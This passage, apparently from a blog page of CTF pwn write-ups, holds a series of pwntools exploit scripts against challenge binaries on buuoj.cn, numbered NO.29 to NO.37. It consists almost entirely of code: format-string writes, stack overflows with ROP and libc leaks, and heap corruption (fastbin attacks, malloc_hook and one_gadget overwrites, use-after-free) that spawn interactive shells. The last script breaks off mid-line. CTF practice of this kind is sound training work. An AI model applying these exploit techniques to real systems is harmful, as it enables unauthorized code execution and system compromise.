class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_fm&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27403)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">x &#x3D; 0x0804A02C</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(x)+&quot;%11$n&quot; #fmtstr_payload(offset,&#123;x:pad&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-30-BJDCTF2nd-r2t4-sovle"><a href="#NO-30-BJDCTF2nd-r2t4-sovle" class="headerlink" title="NO.30 BJDCTF2nd_r2t4_sovle"></a>NO.30 BJDCTF2nd_r2t4_sovle</h1><h3 id="exp-30"><a href="#exp-30" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]r2t4&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26399)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]r2t4&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">backdoor &#x3D; 0x00400626</span><br><span class="line">bss &#x3D; 0x0601050</span><br><span class="line">leave &#x3D; 0x004006BA</span><br><span class="line">__stack_chk_fail &#x3D; elf.got[&#39;__stack_chk_fail&#39;]</span><br><span class="line">payload &#x3D; &#39;aaa%61c%9$hn%1510c%10$hn&#39;+p64(__stack_chk_fail+2)+p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-31-jarvisoj-tell-me-something-sovle"><a href="#NO-31-jarvisoj-tell-me-something-sovle" class="headerlink" title="NO.31 jarvisoj_tell_me_something_sovle"></a>NO.31 jarvisoj_tell_me_something_sovle</h1><h3 id="exp-31"><a href="#exp-31" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_tell_me_something&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26222)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_tell_me_something&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">good_game &#x3D; 0x000400620</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88)+p64(0x0400620)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-32-jarvisoj-level4-sovle"><a href="#NO-32-jarvisoj-level4-sovle" class="headerlink" title="NO.32 jarvisoj_level4_sovle"></a>NO.32 jarvisoj_level4_sovle</h1><h3 id="exp-32"><a href="#exp-32" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level4&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26528)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level4&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print hex(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system  &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-33-jarvisoj-level3-x64-sovle"><a href="#NO-33-jarvisoj-level3-x64-sovle" class="headerlink" title="NO.33 jarvisoj_level3_x64_sovle"></a>NO.33 jarvisoj_level3_x64_sovle</h1><h3 id="exp-33"><a href="#exp-33" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level3_x64&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29849)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level3_x64&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004006b3</span><br><span class="line">pop_rsi_r15 &#x3D; 0x00000000004006b1</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">#print hex(write_plt),hex(write_got)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8)+p64(pop_rdi) + p64(1) </span><br><span class="line">payload +&#x3D; p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u64(p.recv(8))</span><br><span class="line">print hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system  &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8) +p64(pop_rdi)+p64(binsh)+p64(system)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-34-bjdctf-2020-babystack2-sovle"><a href="#NO-34-bjdctf-2020-babystack2-sovle" class="headerlink" title="NO.34 bjdctf_2020_babystack2_sovle"></a>NO.34 bjdctf_2020_babystack2_sovle</h1><h3 id="exp-34"><a href="#exp-34" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babystack2&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26944)</span><br><span class="line">elf &#x3D; ELF(&#39;bjdctf_2020_babystack2&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">backdoor &#x3D; 0x000400726</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;name:\n&#39;)</span><br><span class="line">p.sendline(&#39;-1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10) +p64(0x123123)+ p64(backdoor)</span><br><span class="line">p.recvuntil(&quot;What&#39;s u name?\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-35-VN2020公开赛-simpleHeap-sovle"><a href="#NO-35-VN2020公开赛-simpleHeap-sovle" class="headerlink" title="NO.35 VN2020公开赛_simpleHeap_sovle"></a>NO.35 VN2020公开赛_simpleHeap_sovle</h1><h3 id="exp-35"><a href="#exp-35" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25215)</span><br><span class="line"></span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&quot;size?&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.recvuntil(&quot;idx?&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;content:&quot;)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvuntil(&quot;Done!&quot;)</span><br><span class="line"></span><br><span class="line">def pow(idx):</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(str(3))</span><br><span class="line">p.recvuntil(&quot;idx?&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(str(4))</span><br><span class="line">p.recvuntil(&quot;idx?&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;Done!&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&quot;b free&quot;)</span><br><span class="line">add(0x18,&#39;a&#39;*0x18)#idx0</span><br><span class="line">add(0x10,&#39;b&#39;*0x10)#idx1</span><br><span class="line">add(0x10,&#39;c&#39;*0x10)#idx2</span><br><span class="line"></span><br><span class="line">edit(0,&#39;a&#39;*0x18+p8(0x41))</span><br><span class="line">delete(1)</span><br><span class="line">add(0x30,&#39;e&#39;*0x30) #idx1</span><br><span class="line">#leak libc</span><br><span class="line">edit(1,&#39;a&#39;*0x18+p64(0x91))#溢出修改chunk2的size为0x91</span><br><span class="line">add(0x20,p64(0)*4) #idx3</span><br><span class="line">add(0x30,p64(0)*4+p64(0x90)+p64(0))#idx4</span><br><span class="line">add(0x18,&quot;A&quot;*0x10)  #idx5</span><br><span class="line">add(0x10,&#39;a&#39;*0x18)#idx6</span><br><span class="line">add(0x60,&#39;b&#39;*0x10+p64(0x40)+p64(0x21))#idx7</span><br><span class="line">add(0x60,&#39;c&#39;*0x10)#idx8</span><br><span class="line">add(0x10,&#39;c&#39;*0x10)#idx9</span><br><span class="line">edit(5,&#39;z&#39;*0x18+p8(0x41))</span><br><span class="line">delete(6)</span><br><span class="line">add(0x30,&#39;a&#39;*0x18)#idx6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(2)  #将其释放到unsorted bin里，就可以泄漏unsorted bin的地址</span><br><span class="line">delete(1)</span><br><span class="line">add(0x30,&#39;e&#39;*0x20) #idx1</span><br><span class="line">pow(1)</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;u64(p.recv(38)[32:].ljust(8,&quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.success(&quot;libc_base:&quot;+hex(libc_base))</span><br><span class="line">one_daget_offset&#x3D;[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_daget&#x3D;libc_base+one_daget_offset[1]</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)       #fast bin chunk7&gt;chunk8 </span><br><span class="line">edit(6,&#39;f&#39;*0x18+p64(0x71)+p64(libc_base+0x3c4aed))</span><br><span class="line">add(0x60,&#39;B&#39;*0x10)#get idx7</span><br><span class="line">payload &#x3D; p8(0)*11</span><br><span class="line">payload +&#x3D; p64(one_daget) #realloc_hook 写入one daget</span><br><span class="line">payload+&#x3D; p64(libc_base+0x846C0+0xc)#malloc hook 写入</span><br><span class="line">add(0x60,payload)#get   idx8  malloc_hook chunk</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&quot;size?&quot;)</span><br><span class="line">p.sendline(str(0x10))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-36-hitcontraining-uaf-sovle"><a href="#NO-36-hitcontraining-uaf-sovle" class="headerlink" title="NO.36 hitcontraining_uaf_sovle"></a>NO.36 hitcontraining_uaf_sovle</h1><h3 id="exp-36"><a href="#exp-36" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;hitcontraining_uaf&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28737)</span><br><span class="line">#elf &#x3D; ELF(&#39;hitcontraining_uaf&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">def add(size,content):</span><br><span class="line">        p.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">        p.sendline(&#39;1&#39;)</span><br><span class="line">        p.recvuntil(&#39;Note size :&#39;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">        p.recvuntil(&#39;Content :&#39;)</span><br><span class="line">        p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">        p.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">        p.sendline(&#39;2&#39;)</span><br><span class="line">        p.recvuntil(&#39;Index :&#39;)</span><br><span class="line">        p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def print_note(index):</span><br><span class="line">        p.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">        p.sendline(&#39;3&#39;)</span><br><span class="line">        p.recvuntil(&#39;Index :&#39;)</span><br><span class="line">        p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">binsh &#x3D; 0x08048945</span><br><span class="line">payload &#x3D; p32(binsh)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(0x40,&#39;aaaaaaaaaaaaaaaaaaa&#39;)</span><br><span class="line">add(0x40,&#39;vvvvvvvvvvvvvvvvvvv&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x20,payload)</span><br><span class="line">print_note(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-37-roarctf-2019-easy-pwn-sovle"><a href="#NO-37-roarctf-2019-easy-pwn-sovle" class="headerlink" title="NO.37 roarctf_2019_easy_pwn_sovle"></a>NO.37 roarctf_2019_easy_pwn_sovle</h1><h3 id="exp-37"><a href="#exp-37" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;roarctf_2019_easy_pwn&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27494)</span><br><span class="line">#elf &#x3D; ELF(&#39;roarctf_2019_easy_pwn&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;libc&#x2F;ubuntu16&#x2F;64&#x2F;libc-2.23.so&#39;)</span><br><span class="line">def add(size):</span><br><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size: &#39;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def write(idx,size,content):</span><br><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;2&#39;)</span><br><span class="line">p.recvuntil(&#39;index: &#39;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">sleep(0.6)</span><br><span class="line">p.recvuntil(&#39;size: &#39;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&#39;content: &#39;)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;3&#39;)</span><br><span class="line">p.recvuntil(&#39;index: &#39;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.recvuntil(&#39;index: &#39;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">#return p.recvuntil(&#39;Note&#39;)[:-4]</span><br><span class="line">add(0x58)</span><br><span class="line">add(0x60)</span><br><span class="line">add(0x60)</span><br><span class="line">add(0x60)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(0,0x58+0xa,&#39;a&#39;*0x58+p8(0xe1))</span><br><span class="line">delete(1)</span><br><span class="line">add(0x60)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">show(2)</span><br><span class="line"></span><br><span class="line">main_arean &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x58</span><br><span class="line">libc_base &#x3D; main_arean - 0x3c4b20</span><br><span class="line">one &#x3D; [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">realloc 